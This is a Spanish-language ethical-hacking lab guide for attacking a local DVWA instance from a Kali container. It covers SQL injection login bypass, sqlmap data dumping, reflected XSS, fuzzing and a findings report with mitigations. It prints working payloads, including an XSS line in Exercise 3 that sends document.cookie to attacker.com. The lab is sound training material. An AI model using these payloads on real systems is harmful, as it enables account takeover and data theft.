# Lab 2: Testeo de Aplicaciones Web — DVWA + MySQL

## Objetivos

- Explotar vulnerabilidades comunes en aplicaciones web (OWASP Top 10)
- Realizar inyección SQL y XSS contra aplicaciones vulnerables
- Comprender autenticación en aplicaciones web y cómo explotarla
- Usar herramientas de testing web (Burp Suite, OWASP ZAP) desde Kali
- Documentar findings de seguridad y proponer mitigaciones

## Prerrequisitos

- Docker Engine 24.0 o superior
- Docker Compose 2.0 o superior
- 8GB RAM mínimo
- 5GB de almacenamiento disponible
- Firefox/Chrome en la máquina host (para acceder a DVWA)

## Arquitectura

```
lab2-net (172.18.2.0/24)
├── dvwa (172.18.2.10:80/443) — Aplicación web vulnerable (PHP + Apache)
├── db (172.18.2.20:3306) — Base de datos MySQL
└── kali (172.18.2.30) — Atacante con herramientas de testing web
```

## Quick Start

### Paso 1: Ir al directorio del lab

```bash
cd /ruta/a/Ethical_Hacking/docker-labs/lab2
```

### Paso 2: Levantar los servicios

```bash
# Levantar contenedores en modo background
docker compose up -d

# Esperar 10 segundos a que MySQL y DVWA se inicien
sleep 10

# Verificar que los servicios están corriendo
docker compose ps
```

**Output esperado**:
```
CONTAINER ID   IMAGE                    COMMAND                  STATUS
abc123def456   vulnerables/web-dvwa     "apache2-foreground"     Up 2 seconds
def456ghi789   mariadb:10.5             "docker-entrypoint..."   Up 2 seconds
ghi789jkl012   kalilinux/kali-rolling   "tail -f /dev/null"      Up 2 seconds
```

### Paso 3: Acceder a DVWA

**Opción A: Desde el navegador host**:
```
http://localhost:80 o http://localhost
```

**Opción B: Desde Kali**:
```bash
# Entrar a la consola de Kali
docker compose exec kali bash

# Instalar herramientas de testing
apt update && apt install -y curl wget git python3 python3-pip

# Probar conectividad a DVWA
curl -I http://dvwa
```

## Laboratorio

### Fase 1: Setup de DVWA

**Paso 1: Acceder a DVWA por primera vez**

1. Abre navegador: `http://localhost`
2. Verás una página de setup de DVWA
3. Click en "Create / Reset Database"
4. Usuario: `admin`
5. Contraseña: `password`

**Paso 2: Login en DVWA**

- Usuario: `admin`
- Contraseña: `password`
- Nivel de dificultad: Comienza con "Low"

### Fase 2: Explotación SQL Injection

**Objetivo**: Bypassear autenticación usando SQL Injection

```bash
# Entrar a Kali
docker compose exec kali bash

# Instalar sqlmap (herramienta de SQL injection testing)
apt install -y sqlmap

# Probar SQL injection contra login de DVWA
sqlmap -u "http://dvwa/login.php" \
  --data="username=admin&password=password&Login=Login" \
  --dbs
```

**Manual SQL Injection**:
```bash
# Usar curl para enviar payloads
curl -X POST http://dvwa/login.php \
  -d "username=admin' OR '1'='1&password=anything&Login=Login" \
  -v
```

### Fase 3: Cross-Site Scripting (XSS)

**Objetivo**: Inyectar JavaScript en la aplicación

En DVWA, ir a **Reflected XSS**:

```bash
# Payload XSS simple
curl "http://dvwa/vulnerabilities/xss_r/?name=<script>alert('XSS')</script>"

# Payload XSS con evento
curl "http://dvwa/vulnerabilities/xss_r/?name=<img src=x onerror=alert('XSS')>"
```

### Fase 4: Fuzzing y Descubrimiento de Directorios

```bash
# Desde Kali, instalar herramientas de fuzzing
apt install -y gobuster ffuf

# Fuzzing de directorios
gobuster dir -u http://dvwa -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -t 5

# Fuzzing de parámetros
ffuf -u "http://dvwa/vulnerabilities/xss_r/?FUZZ=test" \
  -w /usr/share/wordlists/common.txt \
  -fw 20
```

### Fase 5: Análisis con Burp Suite

**Desde tu máquina host** (si tienes Burp Suite instalado):

1. Abre Burp Suite
2. Configura proxy en navegador: `127.0.0.1:8080`
3. Intercepta requests a `http://localhost`
4. Modifica parámetros para ver cómo responde la aplicación

### Fase 6: Documentar Findings

```bash
# Dentro de Kali, crear reporte de vulnerabilidades
cat > web_testing_report.md << 'EOF'
# Reporte de Testing Web — Lab 2

## Resumen Ejecutivo
Fecha: $(date)
Objetivo: DVWA en http://dvwa

## Vulnerabilidades Encontradas

### 1. SQL Injection en Login
- **Endpoint**: POST /login.php
- **Severidad**: CRÍTICA
- **Payload**: `admin' OR '1'='1' --`
- **Impacto**: Bypass de autenticación

### 2. XSS Reflejado
- **Endpoint**: GET /vulnerabilities/xss_r/
- **Severidad**: ALTA
- **Payload**: `<script>alert('XSS')</script>`
- **Impacto**: Robo de sesión de usuario

### 3. CSRF (Cross-Site Request Forgery)
- **Vulnerabilidad**: No hay validación de tokens
- **Severidad**: ALTA

## Recomendaciones
1. Usar prepared statements para todas las queries SQL
2. Implementar validación y encoding de input
3. Agregar CSRF tokens a todos los formularios
4. Implementar Content Security Policy (CSP)

EOF

cat web_testing_report.md
```

## Expected Output

### Inicio correcto de Lab 2:

```bash
$ docker compose ps
NAME        IMAGE                    COMMAND              STATUS
lab2-dvwa   vulnerables/web-dvwa     "apache2-foreground" Up 5 seconds
lab2-db     mariadb:10.5             "docker-entrypoint"  Up 6 seconds
lab2-kali   kalilinux/kali-rolling   "tail -f /dev/null"  Up 4 seconds

$ docker compose logs dvwa | head -10
lab2-dvwa | Apache httpd started
lab2-dvwa | [00:00:00] INFO: DVWA ready
```

### Verificación de conectividad desde Kali:

```bash
$ docker compose exec kali bash
root@lab2-kali:/# curl -I http://dvwa
HTTP/1.1 200 OK
Content-Type: text/html; charset=UTF-8
```

### Acceso a base de datos:

```bash
$ docker compose exec db mysql -h 127.0.0.1 -u root -ppassword dvwa -e "SELECT * FROM users LIMIT 5;"
+-------+-------+----------+----------------------------------+
| user_id | user  | password | last_login                        |
+-------+-------+----------+----------------------------------+
| 1     | admin | 5f4dcc3b5aa765d61d8327deb882cf99 | 2026-03-06 10:30:00          |
+-------+-------+----------+----------------------------------+
```

## Exercises

### Exercise 1: Bypass de Autenticación
**Objetivo**: Logearse en DVWA sin conocer la contraseña correcta

**Pasos**:
1. Ir a DVWA login
2. Usar payload SQL injection: `admin' --`
3. Documentar la técnica

### Exercise 2: Extracción de Datos
**Objetivo**: Extraer la lista completa de usuarios usando SQLmap

**Pasos**:
```bash
sqlmap -u "http://dvwa/login.php" --data="username=test&password=test&Login=Login" --dump
```

### Exercise 3: XSS Stealing Cookies
**Objetivo**: Crear un payload XSS que robe cookies de sesión

**Pasos**:
1. Ir a XSS Reflected en DVWA
2. Usar payload: `<script>new Image().src='http://attacker.com/?c='+document.cookie</script>`
3. Configurar listener HTTP para capturar la cookie

### Exercise 4: Análisis de Tráfico
**Objetivo**: Interceptar y modificar requests con Burp Suite

**Pasos**:
1. Instalar certificado de Burp en navegador
2. Interceptar login request
3. Modificar parámetro `username` en tiempo real
4. Observar respuesta modificada

### Exercise 5: Reporte de Pentesting
**Objetivo**: Escribir un reporte profesional con todos los findings

**Pasos**:
1. Documentar todas las vulnerabilidades encontradas
2. Incluir: descripción, impacto, proof-of-concept, recomendación
3. Calcular CVSS scores

## Troubleshooting

### Problema: DVWA no carga en navegador
**Síntomas**: Error 502 Bad Gateway o timeout
**Solución**:
```bash
# Esperar más tiempo (MySQL tarda ~30 segundos en iniciar)
docker compose logs db

# Reiniciar solo DVWA
docker compose restart dvwa

# Verificar conectividad desde Kali
docker compose exec kali curl -I http://dvwa
```

### Problema: Error de base de datos en DVWA
**Síntomas**: "Can't connect to database" en DVWA
**Solución**:
```bash
# Verificar que MySQL está corriendo
docker compose ps db

# Revisar logs
docker compose logs db

# Reiniciar base de datos
docker compose restart db

# Resetear DVWA database
docker compose restart dvwa
```

### Problema: MySQL "connection refused" desde Kali
**Síntomas**: `error: 2003 (HY000): Can't connect to MySQL server`
**Solución**:
```bash
# Usar hostname interno, no IP
docker compose exec kali mysql -h db -u root -ppassword dvwa

# O desde host
docker compose exec db mysql -u root -ppassword dvwa
```

### Problema: Herramientas de Kali no funcionan
**Síntomas**: `command not found: sqlmap`
**Solución**:
```bash
# Actualizar e instalar herramientas
docker compose exec kali bash
apt update
apt install -y sqlmap gobuster ffuf curl wget

# Instalar Python tools
apt install -y python3-pip
pip install requests beautifulsoup4
```

### Problema: Puerto 80 ya está en uso en el host
**Síntomas**: `Error response from daemon: driver failed`
**Solución**:
```bash
# Cambiar puerto en docker-compose.yml
# De: "80:80"
# A:  "8080:80"

# O liberar puerto
lsof -i :80
sudo kill -9 <PID>
```

## Testing Checklist

Antes de considerar el lab completado:

- [ ] `docker compose up -d` completa sin errores
- [ ] `docker compose ps` muestra 3 contenedores en estado `Up`
- [ ] DVWA es accesible en `http://localhost` desde navegador
- [ ] Login con `admin/password` funciona
- [ ] SQLmap detecta SQL injection
- [ ] XSS payload ejecuta en navegador
- [ ] Reporte de vulnerabilidades está documentado
- [ ] Todos los 5 exercises están completados

## Cleanup

### Parar servicios

```bash
docker compose down
```

### Eliminar volúmenes (perder datos de DVWA)

```bash
docker compose down -v
```

### Eliminar imágenes (liberar espacio)

```bash
docker compose down -v
docker rmi vulnerables/web-dvwa mariadb:10.5 kalilinux/kali-rolling
```

## Recursos

- [OWASP Top 10](https://owasp.org/Top10/)
- [DVWA GitHub](https://github.com/digininja/DVWA)
- [SQLmap Tutorial](http://sqlmap.org/)
- [Burp Suite Community Guide](https://portswigger.net/burp/documentation)
- [OWASP Testing Guide](https://owasp.org/www-project-web-security-testing-guide/)
- [Kali Linux Tools](https://www.kali.org/tools/)
